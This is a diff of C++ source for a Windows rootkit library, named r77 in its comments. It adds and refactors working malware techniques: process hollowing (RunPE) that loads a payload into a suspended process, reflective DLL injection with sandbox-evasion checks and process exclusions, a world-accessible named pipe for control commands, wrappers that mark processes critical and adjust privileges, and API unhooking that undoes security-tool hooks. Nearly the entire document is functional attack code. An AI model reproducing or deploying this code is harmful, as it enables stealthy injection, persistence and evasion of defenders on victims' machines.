@@ -261,6 +261,28 @@ BOOL ReadFileContent(LPCWSTR path, LPBYTE *data, LPDWORD size)
 
 	return result;
 }
+BOOL ReadFileStringW(HANDLE file, PWCHAR str, DWORD length)
+{
+	BOOL result = FALSE;
+
+	for (DWORD count = 0; count < length; count++)
+	{
+		DWORD bytesRead;
+		if (!ReadFile(file, &str[count], sizeof(WCHAR), &bytesRead, NULL) || bytesRead != sizeof(WCHAR))
+		{
+			result = FALSE;
+			break;
+		}
+
+		if (str[count] == L'\0')
+		{
+			result = TRUE;
+			break;
+		}
+	}
+
+	return result;
+}
 BOOL WriteFileContent(LPCWSTR path, LPBYTE data, DWORD size)
 {
 	BOOL result = FALSE;
@@ -433,7 +455,145 @@ BOOL DeleteScheduledTask(LPCWSTR name)
 
 	return result;
 }
+HANDLE CreatePublicNamedPipe(LPCWSTR name)
+{
+	// Get security attributes for "EVERYONE", so the named pipe is accessible to all processes.
 
+	SID_IDENTIFIER_AUTHORITY authority = SECURITY_WORLD_SID_AUTHORITY;
+	PSID everyoneSid;
+	if (!AllocateAndInitializeSid(&authority, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &everyoneSid)) return INVALID_HANDLE_VALUE;
+
+	EXPLICIT_ACCESSW explicitAccess;
+	ZeroMemory(&explicitAccess, sizeof(EXPLICIT_ACCESSW));
+	explicitAccess.grfAccessPermissions = FILE_ALL_ACCESS;
+	explicitAccess.grfAccessMode = SET_ACCESS;
+	explicitAccess.grfInheritance = NO_INHERITANCE;
+	explicitAccess.Trustee.TrusteeForm = TRUSTEE_IS_SID;
+	explicitAccess.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+	explicitAccess.Trustee.ptstrName = (LPWSTR)everyoneSid;
+
+	PACL acl;
+	if (SetEntriesInAclW(1, &explicitAccess, NULL, &acl) != ERROR_SUCCESS) return INVALID_HANDLE_VALUE;
+
+	PSECURITY_DESCRIPTOR securityDescriptor = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
+	if (!securityDescriptor ||
+		!InitializeSecurityDescriptor(securityDescriptor, SECURITY_DESCRIPTOR_REVISION) ||
+		!SetSecurityDescriptorDacl(securityDescriptor, TRUE, acl, FALSE)) return INVALID_HANDLE_VALUE;
+
+	SECURITY_ATTRIBUTES securityAttributes;
+	securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
+	securityAttributes.lpSecurityDescriptor = securityDescriptor;
+	securityAttributes.bInheritHandle = FALSE;
+
+	return CreateNamedPipeW(name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, NMPWAIT_USE_DEFAULT_WAIT, &securityAttributes);
+}
+
+BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit)
+{
+	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
+
+	if (ntHeaders->Signature == IMAGE_NT_SIGNATURE)
+	{
+		switch (ntHeaders->OptionalHeader.Magic)
+		{
+			case 0x10b:
+				*is64Bit = FALSE;
+				return TRUE;
+			case 0x20b:
+				*is64Bit = TRUE;
+				return TRUE;
+		}
+	}
+
+	return FALSE;
+}
+BOOL RunPE(LPCWSTR path, LPBYTE payload)
+{
+	// For 32-bit (and 64-bit?) process hollowing, this needs to be attempted several times.
+	// This is a workaround to the well known stability issue of process hollowing.
+	for (DWORD i = 0; i < 5; i++)
+	{
+		DWORD processId = 0;
+		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
+
+		if (ntHeaders->Signature == IMAGE_NT_SIGNATURE)
+		{
+			PROCESS_INFORMATION processInformation;
+			STARTUPINFOW startupInfo;
+			ZeroMemory(&processInformation, sizeof(processInformation));
+			ZeroMemory(&startupInfo, sizeof(startupInfo));
+
+			if (CreateProcessW(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInformation))
+			{
+				processId = processInformation.dwProcessId;
+
+				//TODO: NtUnmapViewOfSection here
+
+				LPVOID imageBase = VirtualAllocEx(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+				if (imageBase && WriteProcessMemory(processInformation.hProcess, imageBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
+				{
+					BOOL sectionsWritten = TRUE;
+
+					for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
+					{
+						PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + j * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER);
+
+						if (!WriteProcessMemory(processInformation.hProcess, (LPBYTE)imageBase + sectionHeader->VirtualAddress, (LPBYTE)payload + sectionHeader->PointerToRawData, sectionHeader->SizeOfRawData, NULL))
+						{
+							sectionsWritten = FALSE;
+							break;
+						}
+					}
+
+					if (sectionsWritten)
+					{
+						LPCONTEXT context = (LPCONTEXT)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
+						if (context)
+						{
+							context->ContextFlags = CONTEXT_FULL;
+
+							if (GetThreadContext(processInformation.hThread, context))
+							{
+#ifdef _WIN64
+								if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Rdx + sizeof(LPVOID) * 2), &ntHeaders->OptionalHeader.ImageBase, sizeof(LPVOID), NULL))
+								{
+									context->Rcx = (DWORD64)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+									if (SetThreadContext(processInformation.hThread, context) &&
+										ResumeThread(processInformation.hThread) != -1)
+									{
+										return TRUE;
+									}
+								}
+#else
+								if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Ebx + sizeof(LPVOID) * 2), &ntHeaders->OptionalHeader.ImageBase, sizeof(LPVOID), NULL))
+								{
+									context->Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+									if (SetThreadContext(processInformation.hThread, context) &&
+										ResumeThread(processInformation.hThread) != -1)
+									{
+										return TRUE;
+									}
+								}
+#endif
+							}
+						}
+					}
+				}
+			}
+		}
+
+		if (processId != 0)
+		{
+			HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
+			if (process)
+			{
+				TerminateProcess(process, 0);
+			}
+		}
+	}
+
+	return FALSE;
+}
 BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 {
 	BOOL result = FALSE;
@@ -445,44 +605,48 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 		HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, processId);
 		if (process)
 		{
-			// Do not inject critical processes (smss, csrss, wininit, etc.).
-			ULONG breakOnTermination;
-			if (NT_SUCCESS(NtQueryInformationProcess(process, PROCESSINFOCLASS::ProcessBreakOnTermination, &breakOnTermination, sizeof(ULONG), NULL)) && !breakOnTermination)
+			// Check, if the executable name is on the exclusion list (see: PROCESS_EXCLUSIONS)
+			if (!IsProcessExcluded(processId))
 			{
-				// Sandboxes tend to crash when injecting shellcode. Only inject medium IL and above.
-				DWORD integrityLevel;
-				if (GetProcessIntegrityLevel(process, &integrityLevel) && integrityLevel >= SECURITY_MANDATORY_MEDIUM_RID)
+				// Do not inject critical processes (smss, csrss, wininit, etc.).
+				ULONG breakOnTermination;
+				if (NT_SUCCESS(NtQueryInformationProcess(process, PROCESSINFOCLASS::ProcessBreakOnTermination, &breakOnTermination, sizeof(ULONG), NULL)) && !breakOnTermination)
 				{
-					// Get function pointer to the shellcode that loads the DLL reflectively.
-					DWORD entryPoint = GetReflectiveDllMain(dll);
-					if (entryPoint)
+					// Sandboxes tend to crash when injecting shellcode. Only inject medium IL and above.
+					DWORD integrityLevel;
+					if (GetProcessIntegrityLevel(process, &integrityLevel) && integrityLevel >= SECURITY_MANDATORY_MEDIUM_RID)
 					{
-						LPBYTE allocatedMemory = (LPBYTE)VirtualAllocEx(process, NULL, dllSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-						if (allocatedMemory)
+						// Get function pointer to the shellcode that loads the DLL reflectively.
+						DWORD entryPoint = GetReflectiveDllMain(dll);
+						if (entryPoint)
 						{
-							if (WriteProcessMemory(process, allocatedMemory, dll, dllSize, NULL))
+							LPBYTE allocatedMemory = (LPBYTE)VirtualAllocEx(process, NULL, dllSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+							if (allocatedMemory)
 							{
-								HANDLE thread = NULL;
-								if (NT_SUCCESS(nt::NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPTHREAD_START_ROUTINE)(allocatedMemory + entryPoint), allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
+								if (WriteProcessMemory(process, allocatedMemory, dll, dllSize, NULL))
 								{
-									if (fast)
+									HANDLE thread = NULL;
+									if (NT_SUCCESS(nt::NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPTHREAD_START_ROUTINE)(allocatedMemory + entryPoint), allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
 									{
-										// Fast mode is for bulk operations, where the return value of this function is ignored.
-										// The return value of DllMain is not checked. This function just returns TRUE, if NtCreateThreadEx succeeded.
-										result = TRUE;
-									}
-									else if (WaitForSingleObject(thread, 100) == WAIT_OBJECT_0)
-									{
-										// Return TRUE, only if DllMain returned TRUE.
-										// DllMain returns FALSE, for example, if r77 is already injected.
-										DWORD exitCode;
-										if (GetExitCodeThread(thread, &exitCode))
+										if (fast)
 										{
-											result = exitCode != 0;
+											// Fast mode is for bulk operations, where the return value of this function is ignored.
+											// The return value of DllMain is not checked. This function just returns TRUE, if NtCreateThreadEx succeeded.
+											result = TRUE;
 										}
-									}
+										else if (WaitForSingleObject(thread, 100) == WAIT_OBJECT_0)
+										{
+											// Return TRUE, only if DllMain returned TRUE.
+											// DllMain returns FALSE, for example, if r77 is already injected.
+											DWORD exitCode;
+											if (GetExitCodeThread(thread, &exitCode))
+											{
+												result = exitCode != 0;
+											}
+										}
 
-									CloseHandle(thread);
+										CloseHandle(thread);
+									}
 								}
 							}
 						}
@@ -498,9 +662,10 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 }
 DWORD GetReflectiveDllMain(LPBYTE dll)
 {
-	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dll + ((PIMAGE_DOS_HEADER)dll)->e_lfanew);
-	if (ntHeaders->OptionalHeader.Magic == 0x10b && sizeof(LPVOID) == 4 || ntHeaders->OptionalHeader.Magic == 0x20b && sizeof(LPVOID) == 8)
+	BOOL is64Bit;
+	if (IsExecutable64Bit(dll, &is64Bit) && is64Bit == (sizeof(LPVOID) == 8))
 	{
+		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dll + ((PIMAGE_DOS_HEADER)dll)->e_lfanew);
 		PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dll + RvaToOffset(dll, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
 		LPDWORD nameDirectory = (LPDWORD)(dll + RvaToOffset(dll, exportDirectory->AddressOfNames));
 		LPWORD nameOrdinalDirectory = (LPWORD)(dll + RvaToOffset(dll, exportDirectory->AddressOfNameOrdinals));
@@ -569,11 +734,11 @@ VOID UnhookDll(LPCWSTR name)
 						LPVOID dllMappedFile = MapViewOfFile(dllMapping, FILE_MAP_READ, 0, 0, 0);
 						if (dllMappedFile)
 						{
-							PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleInfo.lpBaseOfDll + ((PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll)->e_lfanew);
+							PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleInfo.lpBaseOfDll + ((PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll)->e_lfanew);
 
-							for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
+							for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
 							{
-								PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeader) + ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+								PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER));
 
 								// Find the .text section of the hooked DLL and overwrite it with the original DLL section
 								if (!lstrcmpiA((LPCSTR)sectionHeader->Name, ".text"))
@@ -601,6 +766,23 @@ VOID UnhookDll(LPCWSTR name)
 			FreeLibrary(dll);
 		}
 	}
+}
+BOOL IsProcessExcluded(DWORD processId)
+{
+	WCHAR processName[MAX_PATH + 1];
+	if (GetProcessFileName(processId, FALSE, processName, MAX_PATH))
+	{
+		LPCWSTR exclusions[] = PROCESS_EXCLUSIONS;
+		for (int i = 0; i < sizeof(exclusions) / sizeof(LPCWSTR); i++)
+		{
+			if (!lstrcmpiW(processName, exclusions[i]))
+			{
+				return TRUE;
+			}
+		}
+	}
+
+	return FALSE;
 }
 
 PINTEGER_LIST CreateIntegerList()
@@ -1091,37 +1273,9 @@ VOID UninstallR77Config()
 
 DWORD WINAPI ChildProcessListenerThread(LPVOID parameter)
 {
-	// Get security attributes for "EVERYONE", so the named pipe is accessible to all processes.
-
-	SID_IDENTIFIER_AUTHORITY authority = SECURITY_WORLD_SID_AUTHORITY;
-	PSID everyoneSid;
-	if (!AllocateAndInitializeSid(&authority, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &everyoneSid)) return 0;
-
-	EXPLICIT_ACCESSW explicitAccess;
-	ZeroMemory(&explicitAccess, sizeof(EXPLICIT_ACCESSW));
-	explicitAccess.grfAccessPermissions = FILE_ALL_ACCESS;
-	explicitAccess.grfAccessMode = SET_ACCESS;
-	explicitAccess.grfInheritance = NO_INHERITANCE;
-	explicitAccess.Trustee.TrusteeForm = TRUSTEE_IS_SID;
-	explicitAccess.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
-	explicitAccess.Trustee.ptstrName = (LPWSTR)everyoneSid;
-
-	PACL acl;
-	if (SetEntriesInAclW(1, &explicitAccess, NULL, &acl) != ERROR_SUCCESS) return 0;
-
-	PSECURITY_DESCRIPTOR securityDescriptor = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
-	if (!securityDescriptor ||
-		!InitializeSecurityDescriptor(securityDescriptor, SECURITY_DESCRIPTOR_REVISION) ||
-		!SetSecurityDescriptorDacl(securityDescriptor, TRUE, acl, FALSE)) return 0;
-
-	SECURITY_ATTRIBUTES securityAttributes;
-	securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
-	securityAttributes.lpSecurityDescriptor = securityDescriptor;
-	securityAttributes.bInheritHandle = FALSE;
-
 	while (true)
 	{
-		HANDLE pipe = CreateNamedPipeW(sizeof(LPVOID) == 4 ? CHILD_PROCESS_PIPE_NAME32 : CHILD_PROCESS_PIPE_NAME64, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, NMPWAIT_USE_DEFAULT_WAIT, &securityAttributes);
+		HANDLE pipe = CreatePublicNamedPipe(sizeof(LPVOID) == 4 ? CHILD_PROCESS_PIPE_NAME32 : CHILD_PROCESS_PIPE_NAME64);
 		while (pipe != INVALID_HANDLE_VALUE)
 		{
 			if (ConnectNamedPipe(pipe, NULL))
@@ -1236,6 +1390,40 @@ PNEW_PROCESS_LISTENER NewProcessListener(DWORD interval, PROCESSIDCALLBACK callb
 	return notifier;
 }
 
+DWORD WINAPI ControlPipeListenerThread(LPVOID parameter)
+{
+	while (true)
+	{
+		HANDLE pipe = CreatePublicNamedPipe(sizeof(LPVOID) == 4 ? CONTROL_PIPE_NAME : CONTROL_PIPE_REDIRECT64_NAME);
+		while (pipe != INVALID_HANDLE_VALUE)
+		{
+			if (ConnectNamedPipe(pipe, NULL))
+			{
+				DWORD controlCode;
+				DWORD bytesRead;
+				if (ReadFile(pipe, &controlCode, 4, &bytesRead, NULL) && bytesRead == sizeof(DWORD))
+				{
+					((CONTROLCALLBACK)parameter)(controlCode, pipe);
+				}
+			}
+			else
+			{
+				Sleep(1);
+			}
+
+			DisconnectNamedPipe(pipe);
+		}
+
+		Sleep(1);
+	}
+
+	return 0;
+}
+VOID ControlPipeListener(CONTROLCALLBACK callback)
+{
+	CreateThread(NULL, 0, ControlPipeListenerThread, callback, 0, NULL);
+}
+
 namespace nt
 {
 	NTSTATUS NTAPI NtQueryObject(HANDLE handle, nt::OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength)
@@ -1247,5 +1435,13 @@ namespace nt
 		// Use NtCreateThreadEx instead of CreateRemoteThread.
 		// CreateRemoteThread does not work across sessions in Windows 7.
 		return ((nt::NTCREATETHREADEX)GetFunction("ntdll.dll", "NtCreateThreadEx"))(thread, desiredAccess, objectAttributes, processHandle, startAddress, parameter, flags, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, bytesBuffer);
+	}
+	NTSTATUS NTAPI RtlAdjustPrivilege(ULONG privilege, BOOLEAN enablePrivilege, BOOLEAN isThreadPrivilege, PBOOLEAN previousValue)
+	{
+		return ((nt::RTLADJUSTPRIVILEGE)GetFunction("ntdll.dll", "RtlAdjustPrivilege"))(privilege, enablePrivilege, isThreadPrivilege, previousValue);
+	}
+	NTSTATUS NTAPI RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb)
+	{
+		return ((nt::RTLSETPROCESSISCRITICAL)GetFunction("ntdll.dll", "RtlSetProcessIsCritical"))(newIsCritical, oldIsCritical, needScb);
 	}
 }
